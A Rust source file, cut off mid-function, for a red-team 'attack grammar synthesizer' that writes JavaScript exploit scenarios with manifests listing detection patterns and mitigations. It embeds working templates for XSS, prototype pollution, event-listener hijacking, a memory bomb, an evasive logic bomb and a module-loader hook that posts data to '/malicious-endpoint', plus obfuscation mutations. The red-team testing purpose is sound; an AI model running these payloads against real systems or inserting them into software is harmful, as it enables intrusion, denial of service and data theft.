//! Attack grammar synthesizer for red-team exploit scenario generation.
//!
//! Combines adversarial workload synthesis with counterexample generation patterns
//! to produce concrete JavaScript exploit scenarios with corresponding manifest files.
//! Each generated pair consists of a .js exploit implementation and a .manifest.json
//! file describing the attack vector, targets, and expected behavior.
//!
//! Fixed-point millionths (1_000_000 = 1.0) for all fractional values.
//! `BTreeMap`/`BTreeSet` for deterministic iteration.
//!
//! Plan references: bd-cixqu.21.1, U.1 attack grammar.

use std::collections::{BTreeMap, BTreeSet};
use std::fmt;

use serde::{Deserialize, Serialize};

use crate::engine_object_id::{self, EngineObjectId, ObjectDomain, SchemaId};
use crate::hash_tiers::ContentHash;
use crate::security_epoch::SecurityEpoch;

// ---------------------------------------------------------------------------
// Constants
// ---------------------------------------------------------------------------

const ATTACK_SCHEMA_DEF: &[u8] = b"AttackGrammarSynthesizer.v1";
const ATTACK_ZONE: &str = "attack-grammar-synth";

/// Default maximum exploit candidates per strategy.
pub const DEFAULT_MAX_CANDIDATES: u32 = 50;

/// Default maximum mutation iterations per base exploit.
pub const DEFAULT_MAX_MUTATIONS: u32 = 25;

// ---------------------------------------------------------------------------
// AttackStrategy — attack vector synthesis strategies
// ---------------------------------------------------------------------------

/// Strategy used to generate exploit scenarios.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum AttackStrategy {
    /// DOM manipulation and XSS injection patterns.
    DomInjection,
    /// Prototype pollution and object manipulation.
    PrototypePollution,
    /// Event handler hijacking and timing attacks.
    EventHijacking,
    /// Memory pressure and resource exhaustion.
    ResourceExhaustion,
    /// Logic bomb and conditional payload execution.
    LogicBomb,
    /// Supply chain and dependency confusion.
    SupplyChain,
}

impl fmt::Display for AttackStrategy {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::DomInjection => f.write_str("dom-injection"),
            Self::PrototypePollution => f.write_str("prototype-pollution"),
            Self::EventHijacking => f.write_str("event-hijacking"),
            Self::ResourceExhaustion => f.write_str("resource-exhaustion"),
            Self::LogicBomb => f.write_str("logic-bomb"),
            Self::SupplyChain => f.write_str("supply-chain"),
        }
    }
}

// ---------------------------------------------------------------------------
// AttackVector — specific exploit technique within strategy
// ---------------------------------------------------------------------------

/// Specific attack vector within a broader strategy.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum AttackVector {
    /// Cross-site scripting through innerHTML injection.
    XssInjection { payload_type: String },
    /// Object prototype chain corruption.
    PrototypeCorruption { target_property: String },
    /// Race condition exploitation in async handlers.
    RaceCondition { event_sequence: Vec<String> },
    /// Memory allocation bomb through large object creation.
    MemoryBomb { allocation_pattern: String },
    /// Conditional execution based on environment detection.
    ConditionalPayload { trigger_condition: String },
    /// Malicious package substitution.
    PackageSubstitution { target_package: String },
}

// ---------------------------------------------------------------------------
// ExploitTarget — what the attack aims to compromise
// ---------------------------------------------------------------------------

/// Target component or resource for the exploit.
#[derive(Debug, Clone, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum ExploitTarget {
    /// DOM elements and page structure.
    DomTree,
    /// Global JavaScript object namespace.
    GlobalNamespace,
    /// Event handling system.
    EventSystem,
    /// Memory allocation subsystem.
    MemorySubsystem,
    /// Extension runtime environment.
    RuntimeEnvironment,
    /// Third-party dependencies.
    Dependencies,
}

impl fmt::Display for ExploitTarget {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::DomTree => f.write_str("dom-tree"),
            Self::GlobalNamespace => f.write_str("global-namespace"),
            Self::EventSystem => f.write_str("event-system"),
            Self::MemorySubsystem => f.write_str("memory-subsystem"),
            Self::RuntimeEnvironment => f.write_str("runtime-environment"),
            Self::Dependencies => f.write_str("dependencies"),
        }
    }
}

// ---------------------------------------------------------------------------
// ExploitSeverity — impact classification
// ---------------------------------------------------------------------------

/// Severity level of the exploit's potential impact.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum ExploitSeverity {
    /// Information disclosure or minor disruption.
    Low,
    /// Privilege escalation or data modification.
    Medium,
    /// System compromise or data exfiltration.
    High,
    /// Complete system takeover.
    Critical,
}

impl fmt::Display for ExploitSeverity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Low => f.write_str("low"),
            Self::Medium => f.write_str("medium"),
            Self::High => f.write_str("high"),
            Self::Critical => f.write_str("critical"),
        }
    }
}

impl ExploitSeverity {
    /// Convert severity to millionths scale (1_000_000 = critical).
    pub fn to_millionths(self) -> i64 {
        match self {
            Self::Low => 250_000,
            Self::Medium => 500_000,
            Self::High => 750_000,
            Self::Critical => 1_000_000,
        }
    }
}

// ---------------------------------------------------------------------------
// MutationOperator — how to modify base exploits
// ---------------------------------------------------------------------------

/// Mutation operator for evolving exploit scenarios.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
pub enum MutationOperator {
    /// Change payload encoding (base64, hex, unicode).
    PayloadEncoding,
    /// Modify target selectors (id, class, attribute).
    TargetMutation,
    /// Insert obfuscation layers.
    Obfuscation,
    /// Add timing delays and race conditions.
    TimingMutation,
    /// Combine multiple attack vectors.
    VectorCombination,
    /// Change execution context (global, frame, worker).
    ContextMutation,
}

impl fmt::Display for MutationOperator {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::PayloadEncoding => f.write_str("payload-encoding"),
            Self::TargetMutation => f.write_str("target-mutation"),
            Self::Obfuscation => f.write_str("obfuscation"),
            Self::TimingMutation => f.write_str("timing-mutation"),
            Self::VectorCombination => f.write_str("vector-combination"),
            Self::ContextMutation => f.write_str("context-mutation"),
        }
    }
}

// ---------------------------------------------------------------------------
// ExploitManifest — metadata descriptor for exploit
// ---------------------------------------------------------------------------

/// Manifest describing an exploit scenario and its properties.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ExploitManifest {
    /// Unique identifier for this exploit.
    pub exploit_id: EngineObjectId,
    /// Attack strategy classification.
    pub strategy: AttackStrategy,
    /// Specific attack vector.
    pub vector: AttackVector,
    /// Primary target of the exploit.
    pub target: ExploitTarget,
    /// Severity assessment.
    pub severity: ExploitSeverity,
    /// Human-readable description.
    pub description: String,
    /// Preconditions that must be met.
    pub preconditions: BTreeSet<String>,
    /// Expected outcomes if successful.
    pub expected_outcomes: Vec<String>,
    /// Detection signatures and IOCs.
    pub detection_patterns: BTreeSet<String>,
    /// Mitigation strategies.
    pub mitigations: Vec<String>,
    /// Content hash of associated JavaScript code.
    pub code_hash: ContentHash,
    /// Generation epoch.
    pub epoch: SecurityEpoch,
    /// Timestamp when generated.
    pub generated_at_ns: u64,
}

// ---------------------------------------------------------------------------
// ExploitCandidate — complete exploit scenario
// ---------------------------------------------------------------------------

/// A complete exploit candidate with JavaScript code and manifest.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ExploitCandidate {
    /// The exploit manifest.
    pub manifest: ExploitManifest,
    /// JavaScript exploit code.
    pub javascript_code: String,
    /// File name for the .js file.
    pub js_filename: String,
    /// File name for the .manifest.json file.
    pub manifest_filename: String,
}

// ---------------------------------------------------------------------------
// AttackGrammarError
// ---------------------------------------------------------------------------

/// Errors from the attack grammar synthesis system.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum AttackGrammarError {
    /// No base exploits available for mutation.
    NoBaseExploits,
    /// Strategy not supported.
    UnsupportedStrategy { strategy: AttackStrategy },
    /// ID derivation failed.
    IdDerivation(String),
    /// Code generation failed.
    CodeGeneration { reason: String },
    /// Manifest generation failed.
    ManifestGeneration { reason: String },
}

impl fmt::Display for AttackGrammarError {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::NoBaseExploits => f.write_str("no base exploits available for mutation"),
            Self::UnsupportedStrategy { strategy } => {
                write!(f, "unsupported strategy: {strategy}")
            }
            Self::IdDerivation(s) => write!(f, "id derivation: {s}"),
            Self::CodeGeneration { reason } => write!(f, "code generation: {reason}"),
            Self::ManifestGeneration { reason } => write!(f, "manifest generation: {reason}"),
        }
    }
}

impl std::error::Error for AttackGrammarError {}

// ---------------------------------------------------------------------------
// SynthesisConfig — configuration for attack grammar synthesis
// ---------------------------------------------------------------------------

/// Configuration for the attack grammar synthesizer.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct SynthesisConfig {
    /// Maximum candidates to generate per strategy.
    pub max_candidates_per_strategy: u32,
    /// Maximum mutations per base exploit.
    pub max_mutations_per_base: u32,
    /// Preferred attack strategies to focus on.
    pub preferred_strategies: BTreeSet<AttackStrategy>,
    /// Target severity threshold (exploits below this are filtered).
    pub severity_threshold: ExploitSeverity,
    /// Whether to include obfuscation mutations.
    pub include_obfuscation: bool,
    /// Generation epoch.
    pub epoch: SecurityEpoch,
}

impl Default for SynthesisConfig {
    fn default() -> Self {
        let mut strategies = BTreeSet::new();
        strategies.insert(AttackStrategy::DomInjection);
        strategies.insert(AttackStrategy::PrototypePollution);

        Self {
            max_candidates_per_strategy: DEFAULT_MAX_CANDIDATES,
            max_mutations_per_base: DEFAULT_MAX_MUTATIONS,
            preferred_strategies: strategies,
            severity_threshold: ExploitSeverity::Medium,
            include_obfuscation: true,
            epoch: SecurityEpoch::from_raw(1),
        }
    }
}

// ---------------------------------------------------------------------------
// AttackGrammarSynthesizer — the main engine
// ---------------------------------------------------------------------------

/// Synthesizes exploit scenarios using attack grammar and mutation patterns.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AttackGrammarSynthesizer {
    config: SynthesisConfig,
    generated_candidates: Vec<ExploitCandidate>,
    generation_count: u64,
}

impl AttackGrammarSynthesizer {
    /// Create a new synthesizer with the given configuration.
    pub fn new(config: SynthesisConfig) -> Self {
        Self {
            config,
            generated_candidates: Vec::new(),
            generation_count: 0,
        }
    }

    /// Generate exploit candidates for all configured strategies.
    pub fn synthesize_exploits(
        &mut self,
        timestamp_ns: u64,
    ) -> Result<Vec<ExploitCandidate>, AttackGrammarError> {
        let mut all_candidates = Vec::new();

        for &strategy in &self.config.preferred_strategies {
            let candidates = self.synthesize_for_strategy(strategy, timestamp_ns)?;
            all_candidates.extend(candidates);
        }

        // Filter by severity threshold.
        let filtered: Vec<ExploitCandidate> = all_candidates
            .into_iter()
            .filter(|c| c.manifest.severity >= self.config.severity_threshold)
            .collect();

        self.generated_candidates.extend(filtered.clone());
        self.generation_count += filtered.len() as u64;

        Ok(filtered)
    }

    /// Generate candidates for a specific attack strategy.
    fn synthesize_for_strategy(
        &self,
        strategy: AttackStrategy,
        timestamp_ns: u64,
    ) -> Result<Vec<ExploitCandidate>, AttackGrammarError> {
        let base_exploits = self.generate_base_exploits(strategy)?;
        let mut candidates = Vec::new();

        for base in &base_exploits {
            candidates.push(base.clone());

            // Generate mutations of the base exploit.
            let mutations = self.generate_mutations(base, timestamp_ns)?;
            candidates.extend(mutations);

            if candidates.len() >= self.config.max_candidates_per_strategy as usize {
                break;
            }
        }

        // Limit to configured maximum.
        candidates.truncate(self.config.max_candidates_per_strategy as usize);
        Ok(candidates)
    }

    /// Generate base exploit templates for a strategy.
    fn generate_base_exploits(
        &self,
        strategy: AttackStrategy,
    ) -> Result<Vec<ExploitCandidate>, AttackGrammarError> {
        match strategy {
            AttackStrategy::DomInjection => self.generate_dom_injection_exploits(),
            AttackStrategy::PrototypePollution => self.generate_prototype_pollution_exploits(),
            AttackStrategy::EventHijacking => self.generate_event_hijacking_exploits(),
            AttackStrategy::ResourceExhaustion => self.generate_resource_exhaustion_exploits(),
            AttackStrategy::LogicBomb => self.generate_logic_bomb_exploits(),
            AttackStrategy::SupplyChain => self.generate_supply_chain_exploits(),
        }
    }

    /// Generate DOM injection exploit templates.
    fn generate_dom_injection_exploits(&self) -> Result<Vec<ExploitCandidate>, AttackGrammarError> {
        let mut candidates = Vec::new();

        // XSS via innerHTML injection.
        let vector = AttackVector::XssInjection {
            payload_type: "innerHTML".to_string(),
        };
        let manifest = self.build_manifest(
            AttackStrategy::DomInjection,
            vector,
            ExploitTarget::DomTree,
            ExploitSeverity::High,
            "Cross-site scripting through innerHTML injection with script execution",
            &["User input reaches innerHTML", "No content sanitization"],
            &[
                "Execute arbitrary JavaScript",
                "Steal user credentials",
                "Redirect to malicious site",
            ],
        )?;

        let js_code = r#"// DOM Injection Exploit - innerHTML XSS
(function() {
    'use strict';

    // Locate injection points
    function findInjectionTargets() {
        const targets = [];
        const elements = document.querySelectorAll('[id], [class]');
        for (const el of elements) {
            if (el.innerHTML || el.textContent) {
                targets.push(el);
            }
        }
        return targets;
    }

    // Craft XSS payload
    function craftPayload() {
        const payloads = [
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script><"'
        ];
        return payloads[Math.floor(Math.random() * payloads.length)];
    }

    // Execute injection
    function executeInjection() {
        const targets = findInjectionTargets();
        const payload = craftPayload();

        for (const target of targets) {
            try {
                target.innerHTML = payload;
                console.log('Injection successful on:', target);
                break;
            } catch (e) {
                // Try next target
            }
        }
    }

    // Trigger execution
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', executeInjection);
    } else {
        executeInjection();
    }
})();"#;

        candidates.push(ExploitCandidate {
            manifest,
            javascript_code: js_code.to_string(),
            js_filename: "dom_injection_innerHTML_xss.js".to_string(),
            manifest_filename: "dom_injection_innerHTML_xss.manifest.json".to_string(),
        });

        Ok(candidates)
    }

    /// Generate prototype pollution exploit templates.
    fn generate_prototype_pollution_exploits(
        &self,
    ) -> Result<Vec<ExploitCandidate>, AttackGrammarError> {
        let mut candidates = Vec::new();

        let vector = AttackVector::PrototypeCorruption {
            target_property: "__proto__".to_string(),
        };
        let manifest = self.build_manifest(
            AttackStrategy::PrototypePollution,
            vector,
            ExploitTarget::GlobalNamespace,
            ExploitSeverity::Critical,
            "Prototype pollution affecting Object.prototype to inject malicious properties",
            &[
                "Object merge operations",
                "No prototype pollution protection",
            ],
            &[
                "Pollute global namespace",
                "Override security functions",
                "Bypass access controls",
            ],
        )?;

        let js_code = r#"// Prototype Pollution Exploit
(function() {
    'use strict';

    // Pollution vectors
    const pollutionVectors = [
        { path: '__proto__.isAdmin', value: true },
        { path: '__proto__.constructor.prototype.isAdmin', value: true },
        { path: '__proto__.hasPermission', value: () => true },
        { path: '__proto__.toString', value: () => 'bypassed' }
    ];

    // Deep merge pollution
    function pollute(obj, path, value) {
        const keys = path.split('.');
        let current = obj;

        for (let i = 0; i < keys.length - 1; i++) {
            const key = keys[i];
            if (!(key in current)) {
                current[key] = {};
            }
            current = current[key];
        }

        current[keys[keys.length - 1]] = value;
    }

    // Execute pollution
    function executePollution() {
        for (const vector of pollutionVectors) {
            try {
                pollute(Object.prototype, vector.path.replace('__proto__.', ''), vector.value);
                console.log('Pollution successful:', vector.path);
            } catch (e) {
                console.log('Pollution failed:', vector.path, e);
            }
        }

        // Verify pollution
        const testObj = {};
        if (testObj.isAdmin) {
            console.log('Prototype pollution confirmed');
        }
    }

    // Trigger pollution
    executePollution();
})();"#;

        candidates.push(ExploitCandidate {
            manifest,
            javascript_code: js_code.to_string(),
            js_filename: "prototype_pollution_bypass.js".to_string(),
            manifest_filename: "prototype_pollution_bypass.manifest.json".to_string(),
        });

        Ok(candidates)
    }

    /// Generate event hijacking exploit templates.
    fn generate_event_hijacking_exploits(
        &self,
    ) -> Result<Vec<ExploitCandidate>, AttackGrammarError> {
        let mut candidates = Vec::new();

        let vector = AttackVector::RaceCondition {
            event_sequence: vec!["click".to_string(), "load".to_string()],
        };
        let manifest = self.build_manifest(
            AttackStrategy::EventHijacking,
            vector,
            ExploitTarget::EventSystem,
            ExploitSeverity::Medium,
            "Event handler race condition exploitation for privilege escalation",
            &["Async event processing", "Shared mutable state"],
            &[
                "Hijack user actions",
                "Escalate privileges",
                "Bypass authorization",
            ],
        )?;

        let js_code = r#"// Event Hijacking Exploit - Race Condition
(function() {
    'use strict';

    let privilegeState = false;

    // Hijack common events
    function hijackEvents() {
        const originalAddEventListener = Element.prototype.addEventListener;

        Element.prototype.addEventListener = function(type, listener, options) {
            // Intercept security-relevant events
            if (type === 'click' || type === 'submit') {
                const hijackedListener = function(event) {
                    // Race condition: set privilege before original handler
                    privilegeState = true;
                    setTimeout(() => { privilegeState = false; }, 10);

                    return listener.call(this, event);
                };

                return originalAddEventListener.call(this, type, hijackedListener, options);
            }

            return originalAddEventListener.call(this, type, listener, options);
        };
    }

    // Override authorization check
    function overrideAuth() {
        window.checkPermission = function() {
            return privilegeState || false;
        };
    }

    // Execute hijacking
    hijackEvents();
    overrideAuth();

    console.log('Event hijacking active');
})();"#;

        candidates.push(ExploitCandidate {
            manifest,
            javascript_code: js_code.to_string(),
            js_filename: "event_hijacking_race.js".to_string(),
            manifest_filename: "event_hijacking_race.manifest.json".to_string(),
        });

        Ok(candidates)
    }

    /// Generate resource exhaustion exploit templates.
    fn generate_resource_exhaustion_exploits(
        &self,
    ) -> Result<Vec<ExploitCandidate>, AttackGrammarError> {
        let mut candidates = Vec::new();

        let vector = AttackVector::MemoryBomb {
            allocation_pattern: "exponential".to_string(),
        };
        let manifest = self.build_manifest(
            AttackStrategy::ResourceExhaustion,
            vector,
            ExploitTarget::MemorySubsystem,
            ExploitSeverity::Medium,
            "Memory allocation bomb causing denial of service through exponential growth",
            &["No memory limits", "Unbounded object creation"],
            &[
                "Exhaust available memory",
                "Crash browser tab",
                "Denial of service",
            ],
        )?;

        let js_code = r#"// Resource Exhaustion Exploit - Memory Bomb
(function() {
    'use strict';

    const memoryBomb = [];
    let bombSize = 1024;

    function allocateMemory() {
        try {
            for (let i = 0; i < bombSize; i++) {
                // Create large objects with circular references
                const obj = {
                    data: new Array(1024).fill('A'.repeat(1024)),
                    refs: []
                };

                // Create circular references to prevent GC
                obj.refs.push(obj);
                memoryBomb.push(obj);
            }

            bombSize *= 2; // Exponential growth

            // Schedule next allocation
            setTimeout(allocateMemory, 100);

        } catch (e) {
            console.log('Memory allocation failed:', e);
        }
    }

    // Trigger memory bomb
    allocateMemory();

    console.log('Memory bomb armed');
})();"#;

        candidates.push(ExploitCandidate {
            manifest,
            javascript_code: js_code.to_string(),
            js_filename: "memory_bomb_dos.js".to_string(),
            manifest_filename: "memory_bomb_dos.manifest.json".to_string(),
        });

        Ok(candidates)
    }

    /// Generate logic bomb exploit templates.
    fn generate_logic_bomb_exploits(&self) -> Result<Vec<ExploitCandidate>, AttackGrammarError> {
        let mut candidates = Vec::new();

        let vector = AttackVector::ConditionalPayload {
            trigger_condition: "date-based".to_string(),
        };
        let manifest = self.build_manifest(
            AttackStrategy::LogicBomb,
            vector,
            ExploitTarget::RuntimeEnvironment,
            ExploitSeverity::High,
            "Time-based logic bomb with delayed payload execution",
            &["System clock access", "Persistent execution context"],
            &[
                "Execute at predetermined time",
                "Evade detection",
                "Delayed impact",
            ],
        )?;

        let js_code = r#"// Logic Bomb Exploit - Time-based Trigger
(function() {
    'use strict';

    // Configuration
    const TRIGGER_DATE = new Date('2024-12-31T23:59:59Z');
    const PAYLOAD_EXECUTED_KEY = 'logic_bomb_executed';

    function checkTriggerConditions() {
        const now = new Date();
        const alreadyExecuted = localStorage.getItem(PAYLOAD_EXECUTED_KEY);

        // Check date trigger
        if (now >= TRIGGER_DATE && !alreadyExecuted) {
            return true;
        }

        // Check other environmental triggers
        if (navigator.userAgent.includes('Bot') ||
            location.hostname.includes('analysis') ||
            typeof window.phantom !== 'undefined') {
            return false; // Evade analysis
        }

        return false;
    }

    function executePayload() {
        try {
            // Mark as executed
            localStorage.setItem(PAYLOAD_EXECUTED_KEY, 'true');

            // Execute malicious payload
            document.body.innerHTML = '<h1>Logic bomb triggered!</h1>';

            // Additional payload actions
            for (let i = 0; i < 100; i++) {
                window.open('about:blank', '_blank');
            }

            console.log('Logic bomb payload executed');
        } catch (e) {
            console.log('Payload execution failed:', e);
        }
    }

    // Check trigger conditions
    if (checkTriggerConditions()) {
        executePayload();
    } else {
        // Schedule next check
        setTimeout(arguments.callee, 60000); // Check every minute
    }
})();"#;

        candidates.push(ExploitCandidate {
            manifest,
            javascript_code: js_code.to_string(),
            js_filename: "logic_bomb_time_trigger.js".to_string(),
            manifest_filename: "logic_bomb_time_trigger.manifest.json".to_string(),
        });

        Ok(candidates)
    }

    /// Generate supply chain exploit templates.
    fn generate_supply_chain_exploits(&self) -> Result<Vec<ExploitCandidate>, AttackGrammarError> {
        let mut candidates = Vec::new();

        let vector = AttackVector::PackageSubstitution {
            target_package: "common-library".to_string(),
        };
        let manifest = self.build_manifest(
            AttackStrategy::SupplyChain,
            vector,
            ExploitTarget::Dependencies,
            ExploitSeverity::Critical,
            "Supply chain attack through malicious package substitution",
            &[
                "Dynamic import/require",
                "No package integrity verification",
            ],
            &[
                "Compromise dependency chain",
                "Inject malicious code",
                "Persistent access",
            ],
        )?;

        let js_code = r#"// Supply Chain Exploit - Package Substitution
(function() {
    'use strict';

    // Override module loader
    if (typeof require !== 'undefined') {
        const originalRequire = require;

        require = function(moduleName) {
            // Intercept common packages
            const maliciousPackages = [
                'lodash', 'moment', 'axios', 'jquery'
            ];

            if (maliciousPackages.includes(moduleName)) {
                console.log('Intercepting package:', moduleName);

                // Return malicious version
                return {
                    ...originalRequire(moduleName),
                    __malicious: true,
                    run: function() {
                        // Execute payload
                        document.cookie = 'compromised=true; expires=Thu, 01 Jan 2030 00:00:00 UTC; path=/';
                        return 'Package compromised';
                    }
                };
            }

            return originalRequire(moduleName);
        };
    }

    // Override ES6 dynamic imports
    if (typeof window !== 'undefined' && window.import) {
        const originalImport = window.import;

        window.import = function(modulePath) {
            console.log('Intercepting dynamic import:', modulePath);

            return originalImport(modulePath).then(module => {
                // Inject malicious properties
                module.__compromised = true;
                module.sendData = function(data) {
                    fetch('/malicious-endpoint', {
                        method: 'POST',
                        body: JSON.stringify(data)
                    }).catch(() => {});
                };

                return module;
            });
        };
    }

    console.log('Supply chain hooks installed');
})();"#;

        candidates.push(ExploitCandidate {
            manifest,
            javascript_code: js_code.to_string(),
            js_filename: "supply_chain_substitution.js".to_string(),
            manifest_filename: "supply_chain_substitution.manifest.json".to_string(),
        });

        Ok(candidates)
    }

    /// Generate mutations of a base exploit.
    fn generate_mutations(
        &self,
        base: &ExploitCandidate,
        timestamp_ns: u64,
    ) -> Result<Vec<ExploitCandidate>, AttackGrammarError> {
        let mut mutations = Vec::new();

        let operators = if self.config.include_obfuscation {
            vec![
                MutationOperator::PayloadEncoding,
                MutationOperator::TargetMutation,
                MutationOperator::Obfuscation,
                MutationOperator::TimingMutation,
            ]
        } else {
            vec![
                MutationOperator::PayloadEncoding,
                MutationOperator::TargetMutation,
                MutationOperator::TimingMutation,
            ]
        };

        for &operator in &operators {
            if mutations.len() >= self.config.max_mutations_per_base as usize {
                break;
            }

            let mutated = self.apply_mutation(base, operator, timestamp_ns)?;
            mutations.push(mutated);
        }

        Ok(mutations)
    }

    /// Apply a mutation operator to an exploit.
    fn apply_mutation(
        &self,
        base: &ExploitCandidate,
        operator: MutationOperator,
        timestamp_ns: u64,
    ) -> Result<ExploitCandidate, AttackGrammarError> {
        let mut mutated_code = base.javascript_code.clone();
        let mut mutated_manifest = base.manifest.clone();

        match operator {
            MutationOperator::PayloadEncoding => {
                // Base64 encode string literals
                mutated_code = mutated_code.replace(
                    "'XSS'",
                    "atob('WFNT')", // Base64 for 'XSS'
                );
                mutated_code = mutated_code.replace("\"XSS\"", "atob('WFNT')");
            }
            MutationOperator::TargetMutation => {
                // Change DOM selectors
                mutated_code = mutated_code.replace(
                    "querySelectorAll('[id], [class]')",
                    "querySelectorAll('div, span, p')",
                );
                mutated_code = mutated_code.replace("'click'", "'mousedown'");
            }
            MutationOperator::Obfuscation => {
                // Add variable name obfuscation
                mutated_code = format!(
                    "// Obfuscated version\n{}\n/* {} */",
                    mutated_code, "Generated with obfuscation"
                );
            }
            MutationOperator::TimingMutation => {
                // Add random delays
                mutated_code = mutated_code.replace(
                    "setTimeout(executeInjection);",
                    "setTimeout(executeInjection, Math.random() * 1000);",
                );
            }
            MutationOperator::VectorCombination => {
                // Add secondary attack vector
                mutated_code = format!(
                    "{}\n\n// Secondary vector\nsetTimeout(() => console.log('Secondary payload'), 5000);",
                    mutated_code
                );
            }
            MutationOperator::ContextMutation => {
                // Wrap in different execution context
                mutated_code = format!(
                    "(function(window) {{\n{}\n}})(typeof window !== 'undefined' ? window : global);",
                    mutated_code
                );
            }
        }

        // Update manifest
        mutated_manifest.exploit_id = self.derive_exploit_id(
            &format!("{}-{}", base.manifest.exploit_id, operator),
            timestamp_ns,
        )?;
        mutated_manifest.description = format!(
            "{} (mutated with {})",
            mutated_manifest.description, operator
        );
        mutated_manifest.code_hash = ContentHash::compute(mutated_code.as_bytes());

        let filename_suffix = format!("_{}", operator.to_string().replace('-', "_"));

        Ok(ExploitCandidate {
            manifest: mutated_manifest,
            javascript_code: mutated_code,
            js_filename: base
                .js_filename
                .replace(".js", &format!("{}.js", filename_suffix)),
            manifest_filename: base.manifest_filename.replace(
                ".manifest.json",
                &format!("{}.manifest.json", filename_suffix),
            ),
        })
    }

    /// Build an exploit manifest.
    fn build_manifest(
        &self,
        strategy: AttackStrategy,
        vector: AttackVector,
        target: ExploitTarget,
        severity: ExploitSeverity,
        description: &str,
        preconditions: &[&str],
        outcomes: &[&str],
    ) -> Result<ExploitManifest, AttackGrammarError> {
        let exploit_id =
            self.derive_exploit_id(&format!("{}-{}-{}", strategy, target, description), 0)?;

        let detection_patterns: BTreeSet<String> = match strategy {
            AttackStrategy::DomInjection => [
                "innerHTML modification",
                "script tag injection",
                "onerror handler",
            ]
            .iter()
            .map(|s| s.to_string())
            .collect(),
            AttackStrategy::PrototypePollution => [
                "__proto__ access",
                "constructor.prototype modification",
                "Object.prototype pollution",
            ]
            .iter()
            .map(|s| s.to_string())
            .collect(),
            AttackStrategy::EventHijacking => [
                "addEventListener override",
                "event handler modification",
                "privilege escalation",
            ]
            .iter()
            .map(|s| s.to_string())
            .collect(),
            AttackStrategy::ResourceExhaustion => [
                "memory allocation spike",
                "exponential growth",
                "setTimeout loop",
            ]
            .iter()
            .map(|s| s.to_string())
            .collect(),
            AttackStrategy::LogicBomb => [
                "date-based trigger",
                "localStorage access",
                "delayed execution",
            ]
            .iter()
            .map(|s| s.to_string())
            .collect(),
            AttackStrategy::SupplyChain => [
                "require override",
                "dynamic import interception",
                "package substitution",
            ]
            .iter()
            .map(|s| s.to_string())
            .collect(),
        };

        let mitigations = match strategy {
            AttackStrategy::DomInjection => vec![
                "Content Security Policy".to_string(),
                "Input sanitization".to_string(),
                "XSS filtering".to_string(),
            ],
            AttackStrategy::PrototypePollution => vec![
                "Object.freeze(Object.prototype)".to_string(),
                "Prototype pollution detection".to_string(),
                "Safe object merging".to_string(),
            ],
            AttackStrategy::EventHijacking => vec![
                "Event listener validation".to_string(),
                "Privilege verification".to_string(),
                "Race condition prevention".to_string(),
            ],
            AttackStrategy::ResourceExhaustion => vec![
                "Memory limits".to_string(),
                "Resource monitoring".to_string(),
                "Allocation rate limiting".to_string(),
            ],
            AttackStrategy::LogicBomb => vec![
                "Code analysis".to_string(),
                "Execution monitoring".to_string(),
                "Time-based detection".to_string(),
            ],
            AttackStrategy::SupplyChain => vec![
                "Package integrity verification".to_string(),
                "Dependency scanning".to_string(),
                "Module loading restrictions".to_string(),
            ],
        };

        Ok(ExploitManifest {
            exploit_id,
            strategy,
            vector,
            target,
            severity,
            description: description.to_string(),
            preconditions: preconditions.iter().map(|s| s.to_string()).collect(),
            expected_outcomes: outcomes.iter().map(|s| s.to_string()).collect(),
            detection_patterns,
            mitigations,
            code_hash: ContentHash::compute(&[]), // Will be updated when code is generated
            epoch: self.config.epoch,
            generated_at_ns: 0, // Will be set by caller
        })
    }

    /// Derive a deterministic exploit ID.
    fn derive_exploit_id(
        &self,
        content: &str,
        timestamp_ns: u64,
    ) -> Result<EngineObjectId, AttackGrammarError> {
        let schema_id = SchemaId::from_definition(ATTACK_SCHEMA_DEF);
        let mut canonical = Vec::new();
        canonical.extend_from_slice(content.as_bytes());
        canonical.extend_from_slice(&timestamp_ns.to_be_bytes());

        engine_object_id::derive_id(
            ObjectDomain::EvidenceRecord,
            ATTACK_ZONE,
            &schema_id,
            &canonical,
        )
        .map_err(|e| AttackGrammarError::IdDerivation(e.to_string()))
    }

    /// Write exploit candidates to file pairs.
    pub fn write_candidates_to_files(
        &self,
        candidates: &[ExploitCandidate],
        output_dir: &str,
    ) -> Result<Vec<(String, String)>, AttackGrammarError> {
        use std::fs;
        use std::path::Path;

        let output_path = Path::new(output_dir);
        if !output_path.exists() {
            fs::create_dir_all(output_path).map_err(|e| AttackGrammarError::CodeGeneration {
                reason: format!("create output directory: {}", e),
            })?;
        }

        let mut written_files = Vec::new();

        for candidate in candidates {
            // Write JavaScript file
            let js_path = output_path.join(&candidate.js_filename);
            fs::write(&js_path, &candidate.javascript_code).map_err(|e| {
                AttackGrammarError::CodeGeneration {
                    reason: format!("write JS file: {}", e),
                }
            })?;

            // Write manifest file
            let manifest_path = output_path.join(&candidate.manifest_filename);
            let manifest_json = serde_json::to_string_pretty(&candidate.manifest).map_err(|e| {
                AttackGrammarError::ManifestGeneration {
                    reason: format!("serialize manifest: {}", e),
                }
            })?;
            fs::write(&manifest_path, manifest_json).map_err(|e| {
                AttackGrammarError::ManifestGeneration {
                    reason: format!("write manifest file: {}", e),
                }
            })?;

            written_files.push((
